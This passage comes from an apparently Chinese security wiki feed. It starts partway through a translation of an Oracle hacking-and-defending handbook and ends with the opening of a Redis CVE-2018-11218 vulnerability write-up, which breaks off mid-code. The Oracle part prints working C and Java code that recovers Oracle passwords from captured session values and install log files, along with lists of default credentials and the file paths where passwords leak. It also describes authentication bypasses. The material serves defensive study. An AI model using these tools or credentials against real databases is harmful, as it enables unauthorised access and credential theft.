class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">      C:\&gt;cl /TC opass.c</span><br><span class="line">      C:\&gt;opass E:\oracle\ora81\BIN\oracommon8.dll</span><br><span class="line">            EED9B65CCECDB2E9</span><br><span class="line">            DF0536A94ADEE746</span><br><span class="line">            36A2CB576171FEAD</span><br><span class="line"></span><br><span class="line">      Secret is CEAF9C221915EC3E</span><br><span class="line">      Password is password</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      FARPROC kzsrdec = NULL;</span><br><span class="line">      FARPROC kzsrdep = NULL;</span><br><span class="line">      HANDLE oracommon = NULL;</span><br><span class="line">      unsigned char dll_path[260]=&quot;&quot;;</span><br><span class="line">      unsigned char hash[40]=&quot;&quot;;</span><br><span class="line">      unsigned char sess[40]=&quot;&quot;;</span><br><span class="line">      unsigned char pass[260]=&quot;&quot;;</span><br><span class="line">      unsigned char o[20]=&quot;&quot;;</span><br><span class="line">      unsigned char pwd[200]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      if(argc!=5)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">           printf(&quot;\n\t*** Oracle Password Revealer ***\n\n&quot;);</span><br><span class="line">           printf(&quot;\tC:\\&gt;%s &quot;,argv[0]);</span><br><span class="line">           printf(&quot;path_to_oracommon.dll &quot;);</span><br><span class="line">           printf(&quot;password_hash auth_sesskey &quot;);</span><br><span class="line">           printf(&quot;auth_password\n\n&quot;);</span><br><span class="line">           printf(&quot;\tDavid Litchfield\n&quot;);</span><br><span class="line">           printf(&quot;\tdavid@databasesecurity.com\n&quot;);</span><br><span class="line">           printf(&quot;\t10th June 2006\n\n&quot;);</span><br><span class="line">           return 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     strncpy(dll_path,argv[1],256);</span><br><span class="line">     strncpy(hash,argv[2],36);</span><br><span class="line">     strncpy(sess,argv[3],36);</span><br><span class="line">     strncpy(pass,argv[4],256);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(hash,1)==0)</span><br><span class="line">           return printf(&quot;Error in the password hash.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(sess,1)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_sesskey.\n&quot;);</span><br><span class="line"></span><br><span class="line">     if(StringToHex(pass,0)==0)</span><br><span class="line">           return printf(&quot;Error in the auth_password.\n&quot;);</span><br><span class="line"></span><br><span class="line">     oracommon = LoadLibrary(dll_path);</span><br><span class="line">     if(!oracommon)</span><br><span class="line">           return printf(&quot;Failed to load %s\n&quot;,dll_path);</span><br><span class="line"></span><br><span class="line">     kzsrdec = GetProcAddress(oracommon,&quot; kzsrdec&quot;);</span><br><span class="line">     if(!kzsrdec)</span><br><span class="line">           return printf(&quot;No address for kzsrdec.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdep = GetProcAddress(oracommon,&quot; kzsrdep&quot;);</span><br><span class="line">     if(!kzsrdep)</span><br><span class="line">           return printf(&quot;No address for kzsrdep.\n&quot;);</span><br><span class="line"></span><br><span class="line">     kzsrdec(sess,o,hash);</span><br><span class="line"></span><br><span class="line">     printf(&quot;\nSecret is %.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\n&quot;,</span><br><span class="line">           o[0],o[1],o[2],o[3],o[4],o[5],o[6],o[7]);</span><br><span class="line"></span><br><span class="line">     kzsrdep(pwd,pass,strlen(pass),o);</span><br><span class="line"></span><br><span class="line">     printf(&quot;Password is %s\n&quot;,pwd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int StringToHex(char *str,int cnv)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      unsigned int len = 0, c=0,i=0;</span><br><span class="line">      unsigned char a=0,b=0;</span><br><span class="line">      unsigned char tmp[12]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      len = strlen(str);</span><br><span class="line">      if(len &gt; 16)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      while(c &lt; len)</span><br><span class="line">      &#123;</span><br><span class="line">            a = str[c++];</span><br><span class="line">            b = str[c++];</span><br><span class="line">            if(a &gt; 0x2F &amp;&amp; a &lt; 0x3A)</span><br><span class="line">                  a = a - 0x30;</span><br><span class="line">            else if(a &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  a = a - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  a = a - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            if(b &gt; 0x2F &amp;&amp; b &lt; 0x3A)</span><br><span class="line">                  b = b - 0x30;</span><br><span class="line">            else if(b &gt; 0x40 &amp;&amp; a &lt; 0x47)</span><br><span class="line">                  b = b - 0x37;</span><br><span class="line">            else if(a &gt; 0x60 &amp;&amp; a &lt; 0x67)</span><br><span class="line">                  b = b - 0x57;</span><br><span class="line">            else</span><br><span class="line">                  return 0;</span><br><span class="line"></span><br><span class="line">            a = a &lt;&lt; 4;</span><br><span class="line">            a = a + b;</span><br><span class="line">            tmp[i]=a;</span><br><span class="line">            i ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      memset(str,0,len);</span><br><span class="line">      c=0;</span><br><span class="line">      if(cnv)</span><br><span class="line">      &#123;</span><br><span class="line">            while(c &lt; 8)</span><br><span class="line">            &#123;</span><br><span class="line">                  str[c+0]=tmp[c+3];</span><br><span class="line">                  str[c+1]=tmp[c+2];</span><br><span class="line">                  str[c+2]=tmp[c+1];</span><br><span class="line">                  str[c+3]=tmp[c+0];</span><br><span class="line">                  c = c + 4;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return 1;</span><br><span class="line">      &#125;</span><br><span class="line">      while(c &lt; 8)</span><br><span class="line">      &#123;</span><br><span class="line">            str[c]=tmp[c];</span><br><span class="line">            c = c ++;</span><br><span class="line">      &#125;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="默认的用户名和密码"><a href="#默认的用户名和密码" class="headerlink" title="默认的用户名和密码"></a>默认的用户名和密码</h3><p>​        Oracle的默认用户名和密码，较常见的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS/CHANGE_ON_INSTALL</span><br><span class="line">SYSTEM/MANAGER</span><br><span class="line">DBSNMP/DBSNMP</span><br><span class="line">CTXSYS/CTXSYS</span><br><span class="line">MDSYS/MDSYS</span><br><span class="line">SCOTT/TIGER</span><br></pre></td></tr></table></figure><p>​        虽然查找带有默认密码的SYS或SYSTEM帐户并不常见，但通常发现DBSNMP（智能代理帐户）保留了默认密码。这可能是因为如果您仍然希望智能代理能够工作，则需要在两个位置更改密码。第一次密码更改发生在数据库中；第二个密码更改需要在snmp_rw.ora文件中进行。 CTXSYS和MDSYS都是9i中的DBA，尽管它们的默认密码与DBSNMP一样少，但通常也会保留其默认密码。</p><p>​        随着10g的发布，情况大为改善。在安装过程中，系统会提示安装程序输入SYS帐户的密码。然后，也可以为SYSTEM，DBSNMP和SYSMAN帐户设置相同的密码。所有其他帐户都设置为EXPIRED和LOCKED。 EXPIRED表示默认密码已过期，必须更改。但是，对于默认帐户和默认配置文件，可以将密码更改为原始密码。人们通常会这样做，因此使用硬编码密码的较早的应用程序仍然可以正常工作。</p><p>​        尽管10g的密码情况有所改善，但是仍然存在风险。 这样的风险之一是在安装过程中选择的密码会写入某些文件。 例如，在10g第1版中，SYSMAN的密码以明文形式写入$ ORACLE_HOME / hostname_sid / sysman / config目录中的emoms.properties文件中； 10g第2版使用DES加密密码，但是emoms文件还包含解密密钥，因此仍可以检索密码：只需将emdRepPwd和emdRepPwdSeed属性插入最近的DES工具中，然后弹出明文密码。</p><p>​        另一个可能记录密码的潜在文件是DBCreation.log。 假设在安装过程中安装程序选择了一个难以猜测的密码，其中带有感叹号。 设置SYSMAN和DBSNMP帐户的密码后，执行此操作的SQL脚本将执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter user SYSMAN identified by f00bar!! account unlock</span><br><span class="line"></span><br><span class="line">alter user DBSNMP identified by f00bar!! account unlock</span><br></pre></td></tr></table></figure><p>​        由于有感叹号，这会导致错误，然后将其记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line"></span><br><span class="line">ORA-00922: missing or invalid option</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/6.png"></p><p>​        因为SYS和SYSTEM帐户的密码是以不同的方式设置的-一种不会引起错误的方式-因此为他们提供了密码。 因此，如果某人可以访问此文件，则他们可能能够发现SYS和SYSTEM的密码。</p><p>​        记录密码的另一组文件是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/CfmLogger_install_date.log</span><br><span class="line">$ORACLE_HOME/cfgtoollogs/cfgfw/oracle.assistants.server_install_date.log</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME/cfgtoollogs/configToolAllCommands</span><br><span class="line">$ORACLE_HOME/inventory/Components21/oracle.assistants.server/10.2.0.1.0/</span><br><span class="line">context.xml</span><br><span class="line">$ORACLE_HOME/inventory/ContentsXML/ConfigXML/oracle.assistants.server.10</span><br><span class="line">_2_0_1_0.CFM.1.inst.xml</span><br><span class="line"></span><br><span class="line">$ORACLE_HOME\cfgtoollogs\oui\installActions_install_date.log (Windows</span><br><span class="line">only)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        其中install_date指定服务器的安装日期和时间。 但是，这些密码被混淆并显示如下：05da3f3b20f9ee5e1e992d7d35d5c0c679，但是从中恢复明文密码是一件很简单的事情。 SYS，SYSTEM，SYSMAN和DBSNMP的密码都可以从这些文件中恢复。 以下Java调用Checksum包中的Checksum SHA函数。 请注意，该功能不执行SHA操作。 混淆密码中的前导05表示使用DES解密的代码。 接下来的16个字符构成密钥，接下来的16个字符构成密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">$ cp DumpPassword.java /tmp/DumpPassword.java</span><br><span class="line">$ cd /tmp</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/javac -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ /tmp/DumpPassword.java</span><br><span class="line">$ /oracle/product/10.1.0/Db_1/jdk/bin/java -classpath</span><br><span class="line">/tmp:/oracle/product/10.1.0/Db_1/jlib/ DumpPassword</span><br><span class="line">05da3f3b20f9ee5e1e992d7d35d5c0c679</span><br><span class="line">Password is foobar</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import oracle.security.misc.Checksum;</span><br><span class="line"></span><br><span class="line">class DumpPassword</span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">        &#123;</span><br><span class="line">            byte b_in[] = HexToByteArray(args[0]);</span><br><span class="line">            try</span><br><span class="line">              &#123;</span><br><span class="line">                      /* Whilst it says SHA - it&#x27;s not!!! */</span><br><span class="line">                  byte b_out[] = Checksum.SHA(b_in, null);</span><br><span class="line">                  System.out.println</span><br><span class="line">(&quot;Password is &quot;+ ByteToHex(b_out));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch(Exception e)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.out.println(&quot;error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      public static String ByteToHex(byte a[])</span><br><span class="line">        &#123;</span><br><span class="line">            String s=&quot;&quot;;</span><br><span class="line">            for(int i=0; i&lt;a.length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                  s+=(char)a[ i ];</span><br><span class="line">            &#125;</span><br><span class="line">            return s;</span><br><span class="line">      &#125;</span><br><span class="line">      public static byte[] HexToByteArray(String str)</span><br><span class="line">      &#123;</span><br><span class="line">            if(str == null)</span><br><span class="line">                      return new byte[0];</span><br><span class="line">            int len = str.length();</span><br><span class="line">            char hex[] = str.toCharArray();</span><br><span class="line">            byte buf[] = new byte[len / 2];</span><br><span class="line">            for(int pos = 0; pos &lt; len / 2; pos++)</span><br><span class="line">                buf[pos] = (byte)(toData(hex[2 * pos]) &lt;&lt; 4 &amp; 0xf0 |</span><br><span class="line">            toData(hex[2 * pos + 1]) &amp; 0xf);</span><br><span class="line">            return buf;</span><br><span class="line">        &#125;</span><br><span class="line">        private static byte toData(char c)</span><br><span class="line">      &#123;</span><br><span class="line">            if(&#x27;0&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;9&#x27;)</span><br><span class="line">                  return (byte)((byte)c - 48);</span><br><span class="line">            if(&#x27;a&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;f&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 97) + 10);</span><br><span class="line">            if(&#x27;A&#x27; &lt;= c &amp;&amp; c &lt;= &#x27;F&#x27;)</span><br><span class="line">                  return (byte)(((byte)c - 65) + 10);</span><br><span class="line">            else</span><br><span class="line">                  return -1;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        安装10g应用服务器并浏览文件后，发现以下内容也以相同的方式混淆了密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME\inventory\ContentsXML\configtools.xml</span><br><span class="line">$ORACLE_HOME\cfgtoollogs\configtoolsinstalldate.log</span><br><span class="line">$ORACLE_HOME\sysman\emd\targets.xml</span><br><span class="line">$ORACLE_HOME\config\ias.properties</span><br></pre></td></tr></table></figure><h3 id="用户名和密码暴力破解"><a href="#用户名和密码暴力破解" class="headerlink" title="用户名和密码暴力破解"></a>用户名和密码暴力破解</h3><p>​        如前所述，当用户尝试向数据库服务器进行身份验证时，它将发出一个挑战-用来加密密码的会话密钥。仅当帐户实际存在时才会发生，因此可以枚举数据库服务器中的帐户。例如，假设我们要确定是否存在一个名为“ HELPDESK”的帐户。为此，我们可以简单地尝试登录服务器-如果服务器向您提出挑战，则该帐户存在。如果未发出质询，则该帐户不存在。尽管这只是一个信息问题，但它泄漏了足够的信息，从而使攻击者知道该帐户是否存在，从而使对SYS和SYSTEM以外的帐户的暴力登录尝试更加可行。可以通过帐户锁定和确保使用强密码来击败暴力登录尝试-有关如何启用此功能的更多信息，请参见数据库黑客手册中的“保护Oracle”一章。在使用优化的蛮力工具进行的实验室测试中，可以执行c。每秒10次登录尝试。</p><p>长用户名缓冲区溢出<br>​        2003年2月，Mark Litchfield发现，所有OS上的所有版本的Oracle（9iR2和更早版本）在身份验证过程中都容易受到缓冲区溢出漏洞的攻击。通过在登录时传递一个过长的用户名，该用户名被复制到一个基于堆栈的缓冲区中，该缓冲区溢出，从而覆盖关键的程序控制信息。利用此漏洞，攻击者可以完全控制数据库服务器。 Oracle提供了针对此问题的补丁程序，但仍然很普遍，在那里找到容易受到此类攻击的未打补丁的系统。我听说过一个有关此漏洞的故事，但它可能是那些城市传奇之一。显然，一位Oracle副总裁对他们的代码可能包含这样的错误并为开发人员所用而感到愤怒，要求知道谁负责。他悄悄地得知自己是：漏洞隐藏得很久了，直到VP在Oracle还是一名初级程序员时才编写代码。此溢出已在警报51中修复。</p><p>​        在Mark Litchfield发现用户名缓冲区溢出的同一年，在Oracle XML数据库的身份验证过程中发现了更多的溢出。 XML数据库通过TCP端口2100上的FTP和端口8080上的HTTP提供服务。两者都容易受到过长的用户名缓冲区溢出和过长的密码缓冲区溢出的影响。 XML数据库中的这些问题和其他问题是在Blackhat Security Briefings上进行的有关Linux与Windows漏洞利用技术之间的区别的演讲的基础。可以在<a href="http://www.ngssoftware.com/papers/exploitvariation.pdf%E4%B8%8A%E6%89%BE%E5%88%B0%E6%9C%AC%E6%96%87%E7%9A%84%E5%89%AF%E6%9C%AC%E3%80%82%E8%BF%99%E4%BA%9B%E7%BC%BA%E9%99%B7%E7%9A%84%E8%A1%A5%E4%B8%81%E7%A8%8B%E5%BA%8F%E4%BA%8E2003%E5%B9%B48%E6%9C%8818%E6%97%A5%E5%9C%A8Alert">www.ngssoftware.com/papers/exploitvariation.pdf上找到本文的副本。这些缺陷的补丁程序于2003年8月18日在Alert</a> 58中发布。</p><p>Windows XP上有关Oracle的说明<br>        如果将Oracle安装在Windows XP上（例如，开发人员的工具箱），则如果用户是ORA_DBA本地组的成员，则他们可以作为SYSDBA连接到数据库服务器，而无需提供SYS用户的密码。在处理这种登录时，Oracle使用NTLM SSPI AcceptSecurityContext（）函数。如果用户提供了正确的用户名和密码，则此函数返回0并创建一个令牌。这样做的问题是，如果启用了简单文件共享，则所有登录尝试均会成功-该用户将被验证为来宾用户。但是，就Oracle而言，认证原则不是“来宾”，而是远程用户认证时作为用户名提供的任何内容。如果他们提供的用户名是ORA_DBA组中有效用户的名称，则Oracle对用户进行身份验证并授予他们SYSDBA访问权限-真诚地假设远程用户必须具有正确的密码，例如AcceptSecurity。 Context（）“说”它们已成功通过身份验证。攻击者所需要做的就是发现ORA_DBA组成员的名称，并在自己的系统上创建一个具有相同名称的用户。由于密码无关紧要，因此攻击者可以以SYSDBA的身份访问Oracle服务器。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;The  Oracle Hacker’s Handbook: Hacking and Defending Oracle&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by David  Litchfield John Wiley &amp;amp; Sons&lt;/s</summary>
      
    
    
    
    <category term="2. 数据库安全" scheme="http://example.com/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-11218_Redis Lua缓冲区溢出漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T09:02:00.000Z</published>
    <updated>2021-07-06T09:14:57.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis Lua子系统缓冲区溢出漏洞</li><li>漏洞编号：CVE-2018-11218</li><li>漏洞类型：缓冲区溢出</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 3.2.12之前版本、4.0.10之前的4.x版本和5.0 RC2之前的5.x版本中的Lua子系统的cmsgpack库存在缓冲区溢出漏洞，该漏洞源于程序未能执行正确的内存操作。远程攻击者可通过发送请求利用该漏洞造成拒绝服务或执行任意代码。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者可以通过远程连接到redis-server服务器，发送命令执行cmsgpack.pack()函数，触发缓冲区溢出漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:Labs Redis up to 3.2.12<br>Redis:Labs Redis up to 4.0.10<br>Redis:Labs Redis up to 5.0 RC2</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0">https://github.com/redis/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        poc内容为发送一段cmsgpack.pack函数的调用，注入大量的字符，导致拒绝服务。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p>​        发送后无回包</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/3.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight 